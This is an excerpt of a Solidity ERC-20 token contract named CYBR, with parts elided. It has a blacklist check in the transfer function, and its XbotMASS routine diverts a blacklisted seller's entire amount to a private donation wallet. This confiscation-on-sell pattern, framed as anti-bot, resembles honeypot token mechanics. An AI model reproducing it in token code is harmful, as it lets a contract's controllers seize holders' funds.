...
contract CYBR is Context, IERC20, Ownable {
    ...
    address constant private BURN_ADDRESS = 0xFeED01000011010110010100001001010010dEAD;
    address private DONATION_WALLET;
    ...
    function _showBlack(address adr) public view returns(bool) {
        return _blacklist[adr];
    }

    function setCheckTime(uint256 time) public onlyOwner {
        require(time <= 300); // setCheckTime cannot be more than 300 Seconds(5 minutes)
        checkTime = time;
    }

    function _checkTime() public view returns(uint256) {
        return checkTime;
    }
    ...
    function _transfer(
        ...
        if(_pool[recipient]) {
            if(_blacklist[sender]) {
                XbotMASS(sender, amount, blocktime);
            } else {
    ...
    function XbotMASS(address sender, uint256 amount, uint256 blockTime) private {
        _beforeTokenTransfer(sender, DONATION_WALLET, amount);
        ...
        _balances[DONATION_WALLET] += amount;

        emit Transfer(sender, DONATION_WALLET, amount);
        
        _latestTransaction[sender] = blockTime;

        _afterTokenTransfer(sender, DONATION_WALLET, amount);
    } 
